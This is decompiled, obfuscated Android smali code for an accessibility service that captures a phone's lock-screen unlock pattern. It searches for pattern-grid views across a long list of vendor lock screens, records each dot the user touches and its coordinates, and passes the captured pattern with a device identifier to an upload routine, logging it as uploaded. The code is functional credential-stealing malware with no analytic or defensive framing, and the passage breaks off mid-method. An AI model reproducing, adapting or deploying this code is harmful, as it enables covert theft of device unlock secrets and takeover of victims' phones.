.class public abstract Lڝږ؁ڋ/ؼ;
.super Ljava/lang/Object;
.source "SourceFile"


# static fields
.field public static volatile ؋:Z = false

.field public static final ؠ:Landroid/os/Handler;

.field public static ء:Lڝږ؁ڋ/آ;

.field public static آ:Ljava/lang/Runnable;

.field public static أ:Lڝږ؁ڋ/ا;

.field public static volatile ؤ:I

.field public static volatile إ:Ljava/lang/String;

.field public static volatile ئ:Ljava/lang/String;

.field public static volatile ا:I

.field public static volatile ب:I

.field public static volatile ة:Landroid/accessibilityservice/AccessibilityService;

.field public static final ت:Ljava/util/ArrayList;

.field public static final ث:Ljava/util/ArrayList;

.field public static ج:[Z

.field public static final ح:[Ljava/lang/String;


# direct methods
.method public static constructor <clinit>()V
    .locals 27

    new-instance v0, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v1

    invoke-direct {v0, v1}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    sput-object v0, Lڝږ؁ڋ/ؼ;->ؠ:Landroid/os/Handler;

    const/4 v0, 0x0

    sput-object v0, Lڝږ؁ڋ/ؼ;->ء:Lڝږ؁ڋ/آ;

    sput-object v0, Lڝږ؁ڋ/ؼ;->آ:Ljava/lang/Runnable;

    sput-object v0, Lڝږ؁ڋ/ؼ;->أ:Lڝږ؁ڋ/ا;

    const/4 v1, 0x0

    sput v1, Lڝږ؁ڋ/ؼ;->ؤ:I

    const-string v2, ""

    sput-object v2, Lڝږ؁ڋ/ؼ;->إ:Ljava/lang/String;

    sput-object v2, Lڝږ؁ڋ/ؼ;->ئ:Ljava/lang/String;

    sput v1, Lڝږ؁ڋ/ؼ;->ا:I

    sput v1, Lڝږ؁ڋ/ؼ;->ب:I

    sput-object v0, Lڝږ؁ڋ/ؼ;->ة:Landroid/accessibilityservice/AccessibilityService;

    new-instance v0, Ljava/util/ArrayList;

    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    sput-object v0, Lڝږ؁ڋ/ؼ;->ت:Ljava/util/ArrayList;

    new-instance v0, Ljava/util/ArrayList;

    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    sput-object v0, Lڝږ؁ڋ/ؼ;->ث:Ljava/util/ArrayList;

    const/16 v0, 0x9

    new-array v0, v0, [Z

    sput-object v0, Lڝږ؁ڋ/ؼ;->ج:[Z

    const-string v1, "com.android.systemui:id/colorLockPatternView"

    const-string v2, "com.android.systemui:id/lockPatternView"

    const-string v3, "com.android.systemui:id/lock_pattern_view"

    const-string v4, "com.sec.android.app.keyguard:id/lockPatternView"

    const-string v5, "com.samsung.android.keyguard:id/lockPatternView"

    const-string v6, "com.huawei.systemui:id/lockPatternView"

    const-string v7, "com.huawei.systemui:id/lock_pattern_view"

    const-string v8, "com.miui.keyguard:id/lockPatternView"

    const-string v9, "com.miui.keyguard:id/miui_lock_pattern_view"

    const-string v10, "com.coloros.systemui:id/lockPatternView"

    const-string v11, "com.oppo.systemui:id/lockPatternView"

    const-string v12, "com.oplus.systemui:id/lockPatternView"

    const-string v13, "com.bbk.lockscreen:id/lockPatternView"

    const-string v14, "com.vivo.systemui:id/lockPatternView"

    const-string v15, "com.oneplus.systemui:id/lockPatternView"

    const-string v16, "com.realme.systemui:id/lockPatternView"

    const-string v17, "com.nothing.systemui:id/lockPatternView"

    const-string v18, "com.tecno.systemui:id/lockPatternView"

    const-string v19, "com.infinix.systemui:id/lockPatternView"

    const-string v20, "com.itel.systemui:id/lockPatternView"

    const-string v21, "com.transsion.systemui:id/lockPatternView"

    const-string v22, "com.lge.systemui:id/lockPatternView"

    const-string v23, "com.motorola.systemui:id/lockPatternView"

    const-string v24, "com.zte.systemui:id/lockPatternView"

    const-string v25, "com.tcl.systemui:id/lockPatternView"

    const-string v26, "com.hmd.systemui:id/lockPatternView"

    filled-new-array/range {v1 .. v26}, [Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lڝږ؁ڋ/ؼ;->ح:[Ljava/lang/String;

    return-void
.end method

.method public static ؋(Ljava/lang/String;)V
    .locals 2

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, "PAT_CAP "

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, p0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p0

    const-string v0, "MyAccessSvc"

    invoke-static {v0, p0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    return-void
.end method

.method public static ؠ(Landroid/view/accessibility/AccessibilityNodeInfo;)Landroid/view/accessibility/AccessibilityNodeInfo;
    .locals 6

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getViewIdResourceName()Ljava/lang/String;

    move-result-object v0

    const/4 v1, 0x0

    if-eqz v0, :cond_1

    sget-object v2, Lڝږ؁ڋ/ؼ;->ح:[Ljava/lang/String;

    array-length v3, v2

    move v4, v1

    :goto_0
    if-ge v4, v3, :cond_1

    aget-object v5, v2, v4

    invoke-virtual {v5, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-eqz v5, :cond_0

    return-object p0

    :cond_0
    add-int/lit8 v4, v4, 0x1

    goto :goto_0

    :cond_1
    :goto_1
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChildCount()I

    move-result v0

    if-ge v1, v0, :cond_3

    invoke-virtual {p0, v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    if-eqz v0, :cond_2

    invoke-static {v0}, Lڝږ؁ڋ/ؼ;->ؠ(Landroid/view/accessibility/AccessibilityNodeInfo;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    if-eqz v0, :cond_2

    return-object v0

    :cond_2
    add-int/lit8 v1, v1, 0x1

    goto :goto_1

    :cond_3
    const/4 p0, 0x0

    return-object p0
.end method

.method public static ء(Landroid/view/accessibility/AccessibilityNodeInfo;)Landroid/view/accessibility/AccessibilityNodeInfo;
    .locals 7

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChildCount()I

    move-result v0

    const/16 v1, 0x9

    const/4 v2, 0x0

    if-ne v0, v1, :cond_5

    move v0, v2

    move v3, v0

    :goto_0
    if-ge v0, v1, :cond_4

    invoke-virtual {p0, v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v4

    if-eqz v4, :cond_3

    invoke-virtual {v4}, Landroid/view/accessibility/AccessibilityNodeInfo;->getPackageName()Ljava/lang/CharSequence;

    move-result-object v5

    invoke-virtual {v4}, Landroid/view/accessibility/AccessibilityNodeInfo;->getClassName()Ljava/lang/CharSequence;

    move-result-object v4

    if-eqz v5, :cond_3

    invoke-interface {v5}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v5

    if-nez v5, :cond_0

    goto :goto_1

    :cond_0
    const-string v6, "systemui"

    invoke-virtual {v5, v6}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v6

    if-nez v6, :cond_2

    const-string v6, "keyguard"

    invoke-virtual {v5, v6}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v6

    if-nez v6, :cond_2

    const-string v6, "lockscreen"

    invoke-virtual {v5, v6}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v5

    if-eqz v5, :cond_1

    goto :goto_2

    :cond_1
    :goto_1
    move v5, v2

    goto :goto_3

    :cond_2
    :goto_2
    const/4 v5, 0x1

    :goto_3
    if-eqz v5, :cond_3

    if-eqz v4, :cond_3

    const-string v5, "android.view.View"

    invoke-interface {v4}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v5, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_3

    add-int/lit8 v3, v3, 0x1

    :cond_3
    add-int/lit8 v0, v0, 0x1

    goto :goto_0

    :cond_4
    const/4 v0, 0x6

    if-lt v3, v0, :cond_5

    return-object p0

    :cond_5
    :goto_4
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChildCount()I

    move-result v0

    if-ge v2, v0, :cond_7

    invoke-virtual {p0, v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    if-eqz v0, :cond_6

    invoke-static {v0}, Lڝږ؁ڋ/ؼ;->ء(Landroid/view/accessibility/AccessibilityNodeInfo;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    if-eqz v0, :cond_6

    return-object v0

    :cond_6
    add-int/lit8 v2, v2, 0x1

    goto :goto_4

    :cond_7
    const/4 p0, 0x0

    return-object p0
.end method

.method public static آ()V
    .locals 12

    sget-object v0, Lڝږ؁ڋ/ؼ;->آ:Ljava/lang/Runnable;

    const/4 v1, 0x0

    if-eqz v0, :cond_0

    sget-object v2, Lڝږ؁ڋ/ؼ;->ؠ:Landroid/os/Handler;

    invoke-virtual {v2, v0}, Landroid/os/Handler;->removeCallbacks(Ljava/lang/Runnable;)V

    sput-object v1, Lڝږ؁ڋ/ؼ;->آ:Ljava/lang/Runnable;

    :cond_0
    sget-object v0, Lڝږ؁ڋ/ؼ;->أ:Lڝږ؁ڋ/ا;

    if-eqz v0, :cond_1

    sget-object v2, Lڝږ؁ڋ/ؼ;->ؠ:Landroid/os/Handler;

    invoke-virtual {v2, v0}, Landroid/os/Handler;->removeCallbacks(Ljava/lang/Runnable;)V

    sput-object v1, Lڝږ؁ڋ/ؼ;->أ:Lڝږ؁ڋ/ا;

    :cond_1
    sget v0, Lڝږ؁ڋ/ؼ;->ؤ:I

    const/4 v1, 0x3

    const/4 v2, 0x0

    if-lt v0, v1, :cond_2

    sget-object v0, Lڝږ؁ڋ/ؼ;->إ:Ljava/lang/String;

    invoke-virtual {v0}, Ljava/lang/String;->isEmpty()Z

    move-result v0

    if-nez v0, :cond_2

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, "FLUSH text="

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    sget-object v1, Lڝږ؁ڋ/ؼ;->إ:Ljava/lang/String;

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v1, " points="

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v1, Lڝږ؁ڋ/ؼ;->ئ:Ljava/lang/String;

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lڝږ؁ڋ/ؼ;->؋(Ljava/lang/String;)V

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, "pattern_"

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v3

    invoke-virtual {v0, v3, v4}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-static {}, Lسۄھؤۏ۫/؋;->ذ()Ljava/lang/String;

    move-result-object v6

    const-string v7, "com.android.systemui"

    const-string v8, ""

    const-string v9, "system"

    sget-object v10, Lڝږ؁ڋ/ؼ;->إ:Ljava/lang/String;

    sget-object v11, Lڝږ؁ڋ/ؼ;->ئ:Ljava/lang/String;

    invoke-static/range {v5 .. v11}, Lڜٟٱڀ/ت;->؋(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    sput-boolean v2, Lڜٟٱڀ/ت;->ئ:Z

    const/4 v0, 0x1

    invoke-static {v0}, Lڜٟٱڀ/ت;->ؠ(Z)V

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, "UPLOADED text="

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    sget-object v1, Lڝږ؁ڋ/ؼ;->إ:Ljava/lang/String;

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    goto :goto_0

    :cond_2
    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, "FLUSH_SKIP dots="

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    sget v1, Lڝږ؁ڋ/ؼ;->ؤ:I

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    :goto_0
    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lڝږ؁ڋ/ؼ;->؋(Ljava/lang/String;)V

    sput v2, Lڝږ؁ڋ/ؼ;->ؤ:I

    const-string v0, ""

    sput-object v0, Lڝږ؁ڋ/ؼ;->إ:Ljava/lang/String;

    sput-object v0, Lڝږ؁ڋ/ؼ;->ئ:Ljava/lang/String;

    sput v2, Lڝږ؁ڋ/ؼ;->ا:I

    sget-object v0, Lڝږ؁ڋ/ؼ;->ت:Ljava/util/ArrayList;

    invoke-virtual {v0}, Ljava/util/ArrayList;->clear()V

    sget-object v0, Lڝږ؁ڋ/ؼ;->ث:Ljava/util/ArrayList;

    invoke-virtual {v0}, Ljava/util/ArrayList;->clear()V

    const/16 v0, 0x9

    new-array v0, v0, [Z

    sput-object v0, Lڝږ؁ڋ/ؼ;->ج:[Z

    sput-boolean v2, Lڝږ؁ڋ/ؼ;->؋:Z

    return-void
.end method

.method public static أ(Ljava/lang/String;Ljava/util/ArrayList;)Ljava/lang/String;
    .locals 3

    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const/4 v1, 0x0

    :goto_0
    invoke-virtual {p1}, Ljava/util/ArrayList;->size()I

    move-result v2

    if-ge v1, v2, :cond_1

    if-lez v1, :cond_0

    invoke-virtual {v0, p0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    :cond_0
    invoke-virtual {p1, v1}, Ljava/util/ArrayList;->get(I)Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Ljava/lang/String;

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    add-int/lit8 v1, v1, 0x1

    goto :goto_0

    :cond_1
    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p0

    return-object p0
.end method

.method public static ؤ(Ljava/lang/String;)V
    .locals 3

    sget-boolean v0, Lڝږ؁ڋ/ؼ;->؋:Z

    if-eqz v0, :cond_0

    sget v0, Lڝږ؁ڋ/ؼ;->ؤ:I

    const/4 v1, 0x3

    if-lt v0, v1, :cond_0

    new-instance p0, Ljava/lang/StringBuilder;

    const-string v0, "SCREEN_DETECTED ignored (active with "

    invoke-direct {p0, v0}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    sget v0, Lڝږ؁ڋ/ؼ;->ؤ:I

    invoke-virtual {p0, v0}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string v0, " dots)"

    invoke-virtual {p0, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p0

    invoke-static {p0}, Lڝږ؁ڋ/ؼ;->؋(Ljava/lang/String;)V

    return-void

    :cond_0
    sget-boolean v0, Lڝږ؁ڋ/ؼ;->؋:Z

    if-nez v0, :cond_1

    const/4 v0, 0x0

    sput v0, Lڝږ؁ڋ/ؼ;->ؤ:I

    const-string v1, ""

    sput-object v1, Lڝږ؁ڋ/ؼ;->إ:Ljava/lang/String;

    sput-object v1, Lڝږ؁ڋ/ؼ;->ئ:Ljava/lang/String;

    sget-object v1, Lڝږ؁ڋ/ؼ;->ت:Ljava/util/ArrayList;

    invoke-virtual {v1}, Ljava/util/ArrayList;->clear()V

    sget-object v1, Lڝږ؁ڋ/ؼ;->ث:Ljava/util/ArrayList;

    invoke-virtual {v1}, Ljava/util/ArrayList;->clear()V

    const/16 v1, 0x9

    new-array v1, v1, [Z

    sput-object v1, Lڝږ؁ڋ/ؼ;->ج:[Z

    sput v0, Lڝږ؁ڋ/ؼ;->ا:I

    sput v0, Lڝږ؁ڋ/ؼ;->ب:I

    :cond_1
    const/4 v0, 0x1

    sput-boolean v0, Lڝږ؁ڋ/ؼ;->؋:Z

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, "SCREEN_DETECTED pkg="

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, p0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p0

    invoke-static {p0}, Lڝږ؁ڋ/ؼ;->؋(Ljava/lang/String;)V

    sget-object p0, Lڝږ؁ڋ/ؼ;->آ:Ljava/lang/Runnable;

    if-eqz p0, :cond_2

    goto :goto_0

    :cond_2
    new-instance p0, Lڝږ؁ڋ/ػ;

    invoke-direct {p0}, Lڝږ؁ڋ/ػ;-><init>()V

    sput-object p0, Lڝږ؁ڋ/ؼ;->آ:Ljava/lang/Runnable;

    sget-object v0, Lڝږ؁ڋ/ؼ;->ؠ:Landroid/os/Handler;

    const-wide/16 v1, 0x1e

    invoke-virtual {v0, p0, v1, v2}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    :goto_0
    return-void
.end method

.method public static إ(Landroid/accessibilityservice/AccessibilityService;)V
    .locals 14

    :try_start_0
    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object p0
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_3

    if-nez p0, :cond_0

    return-void

    :cond_0
    invoke-static {p0}, Lڝږ؁ڋ/ؼ;->ؠ(Landroid/view/accessibility/AccessibilityNodeInfo;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    const/16 v1, 0x9

    if-eqz v0, :cond_1

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChildCount()I

    move-result v2

    if-ne v2, v1, :cond_1

    goto :goto_0

    :cond_1
    invoke-static {p0}, Lڝږ؁ڋ/ؼ;->ء(Landroid/view/accessibility/AccessibilityNodeInfo;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    :goto_0
    const/4 v2, 0x1

    const/4 v3, 0x3

    const/4 v4, 0x0

    if-nez v0, :cond_5

    sget v0, Lڝږ؁ڋ/ؼ;->ب:I

    add-int/2addr v0, v2

    sput v0, Lڝږ؁ڋ/ؼ;->ب:I

    sget v0, Lڝږ؁ڋ/ؼ;->ؤ:I

    if-lt v0, v3, :cond_2

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, "NO_GRID with data("

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    sget v1, Lڝږ؁ڋ/ؼ;->ؤ:I

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string v1, " dots) - flushing"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lڝږ؁ڋ/ؼ;->؋(Ljava/lang/String;)V

    :try_start_1
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_2

    goto/16 :goto_b

    :cond_2
    sget v0, Lڝږ؁ڋ/ؼ;->ب:I

    const/16 v1, 0xa

    if-lt v0, v1, :cond_4

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, "NO_GRID_PARENT x"

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    sget v1, Lڝږ؁ڋ/ؼ;->ب:I

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string v1, " stopping poll"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lڝږ؁ڋ/ؼ;->؋(Ljava/lang/String;)V

    sget-object v0, Lڝږ؁ڋ/ؼ;->آ:Ljava/lang/Runnable;

    if-eqz v0, :cond_3

    sget-object v1, Lڝږ؁ڋ/ؼ;->ؠ:Landroid/os/Handler;

    invoke-virtual {v1, v0}, Landroid/os/Handler;->removeCallbacks(Ljava/lang/Runnable;)V

    const/4 v0, 0x0

    sput-object v0, Lڝږ؁ڋ/ؼ;->آ:Ljava/lang/Runnable;

    :cond_3
    sput-boolean v4, Lڝږ؁ڋ/ؼ;->؋:Z

    :cond_4
    :try_start_2
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0

    :catch_0
    return-void

    :cond_5
    sput v4, Lڝږ؁ڋ/ؼ;->ب:I

    move v5, v4

    :goto_1
    if-ge v5, v1, :cond_8

    invoke-virtual {v0, v5}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v6

    if-eqz v6, :cond_7

    invoke-virtual {v6}, Landroid/view/accessibility/AccessibilityNodeInfo;->isSelected()Z

    move-result v7

    if-nez v7, :cond_6

    invoke-virtual {v6}, Landroid/view/accessibility/AccessibilityNodeInfo;->isChecked()Z

    move-result v6

    if-eqz v6, :cond_7

    :cond_6
    move v5, v2

    goto :goto_2

    :cond_7
    add-int/lit8 v5, v5, 0x1

    goto :goto_1

    :cond_8
    move v5, v4

    :goto_2
    new-array v6, v1, [Z

    new-array v7, v1, [Landroid/graphics/Rect;

    move v8, v4

    move v9, v8

    :goto_3
    if-ge v8, v1, :cond_10

    invoke-virtual {v0, v8}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v10

    if-nez v10, :cond_9

    goto :goto_8

    :cond_9
    invoke-virtual {v10}, Landroid/view/accessibility/AccessibilityNodeInfo;->getPackageName()Ljava/lang/CharSequence;

    move-result-object v11

    invoke-virtual {v10}, Landroid/view/accessibility/AccessibilityNodeInfo;->getClassName()Ljava/lang/CharSequence;

    move-result-object v12

    if-eqz v11, :cond_a

    const-string v13, "com.android.systemui"

    invoke-interface {v11}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v11

    invoke-virtual {v13, v11}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v11

    if-eqz v11, :cond_a

    move v11, v2

    goto :goto_4

    :cond_a
    move v11, v4

    :goto_4
    if-eqz v12, :cond_b

    const-string v13, "android.view.View"

    invoke-interface {v12}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v12

    invoke-virtual {v13, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_b

    move v12, v2

    goto :goto_5

    :cond_b
    move v12, v4

    :goto_5
    if-eqz v5, :cond_c

    if-eqz v11, :cond_e

    if-eqz v12, :cond_e

    invoke-virtual {v10}, Landroid/view/accessibility/AccessibilityNodeInfo;->isSelected()Z

    move-result v11

    if-nez v11, :cond_d

    invoke-virtual {v10}, Landroid/view/accessibility/AccessibilityNodeInfo;->isChecked()Z

    move-result v11

    if-eqz v11, :cond_e

    goto :goto_6

    :cond_c
    if-eqz v11, :cond_e

    if-eqz v12, :cond_e

    invoke-virtual {v10}, Landroid/view/accessibility/AccessibilityNodeInfo;->isClickable()Z

    move-result v11

    if-nez v11, :cond_e

    :cond_d
    :goto_6
    move v11, v2

    goto :goto_7

    :cond_e
    move v11, v4

    :goto_7
    if-eqz v11, :cond_f

    aput-boolean v2, v6, v8

    add-int/lit8 v9, v9, 0x1

    new-instance v11, Landroid/graphics/Rect;

    invoke-direct {v11}, Landroid/graphics/Rect;-><init>()V

    invoke-virtual {v10, v11}, Landroid/view/accessibility/AccessibilityNodeInfo;->getBoundsInScreen(Landroid/graphics/Rect;)V

    aput-object v11, v7, v8

    :cond_f
    :goto_8
    add-int/lit8 v8, v8, 0x1

    goto :goto_3

    :cond_10
    :try_start_3
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_1

    :catch_1
    move p0, v4

    :goto_9
    const-string v0, ","

    if-ge p0, v1, :cond_13

    aget-boolean v5, v6, p0

    if-eqz v5, :cond_12

    sget-object v5, Lڝږ؁ڋ/ؼ;->ج:[Z

    aget-boolean v5, v5, p0

    if-nez v5, :cond_12

    add-int/lit8 v5, p0, 0x1

    sget-object v8, Lڝږ؁ڋ/ؼ;->ت:Ljava/util/ArrayList;

    invoke-static {v5}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v10

    invoke-virtual {v8, v10}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    aget-object v10, v7, p0

    if-eqz v10, :cond_11

    sget-object v10, Lڝږ؁ڋ/ؼ;->ث:Ljava/util/ArrayList;

    new-instance v11, Ljava/lang/StringBuilder;

    invoke-direct {v11}, Ljava/lang/StringBuilder;-><init>()V

    aget-object v12, v7, p0

    invoke-virtual {v12}, Landroid/graphics/Rect;->centerX()I

    move-result v12

    invoke-virtual {v11, v12}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v11, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    aget-object v0, v7, p0

    invoke-virtual {v0}, Landroid/graphics/Rect;->centerY()I

    move-result v0

    invoke-virtual {v11, v0}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v11}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v10, v0}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    :cond_11
    const-string v0, "NEW_DOT "

    const-string v10, " total="

    invoke-static {v0, v5, v10}, Landroidx/activity/result/؋;->ة(Ljava/lang/String;ILjava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v8}, Ljava/util/ArrayList;->size()I

    move-result v5

    invoke-virtual {v0, v5}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lڝږ؁ڋ/ؼ;->؋(Ljava/lang/String;)V

    :cond_12
    add-int/lit8 p0, p0, 0x1

    goto :goto_9

    :cond_13
    sget-object p0, Lڝږ؁ڋ/ؼ;->ج:[Z

    invoke-static {v6, v4, p0, v4, v1}, Ljava/lang/System;->arraycopy(Ljava/lang/Object;ILjava/lang/Object;II)V

    sget p0, Lڝږ؁ڋ/ؼ;->ا:I

    if-le v9, p0, :cond_14

    sput v9, Lڝږ؁ڋ/ؼ;->ا:I

    :cond_14
    sget-object p0, Lڝږ؁ڋ/ؼ;->ت:Ljava/util/ArrayList;

    invoke-virtual {p0}, Ljava/util/ArrayList;->size()I

    move-result v4

    if-ne v9, v1, :cond_15

    sget v5, Lڝږ؁ڋ/ؼ;->ؤ:I

    if-lt v5, v3, :cond_15

    sget v5, Lڝږ؁ڋ/ؼ;->ؤ:I

    if-ge v5, v1, :cond_15

    const-string p0, "ALL_9_ANIMATION flush"

    goto :goto_a

    :cond_15
    const-string v1, " flush"

    if-nez v9, :cond_16

    sget v5, Lڝږ؁ڋ/ؼ;->ا:I

    if-lt v5, v3, :cond_16

    new-instance p0, Ljava/lang/StringBuilder;

    const-string v0, "DOTS_CLEARED peak="

    invoke-direct {p0, v0}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    sget v0, Lڝږ؁ڋ/ؼ;->ا:I

    invoke-virtual {p0, v0}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {p0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p0

    :goto_a
    invoke-static {p0}, Lڝږ؁ڋ/ؼ;->؋(Ljava/lang/String;)V

    :catch_2
    :goto_b
    invoke-static {}, Lڝږ؁ڋ/ؼ;->آ()V

    return-void

    :cond_16
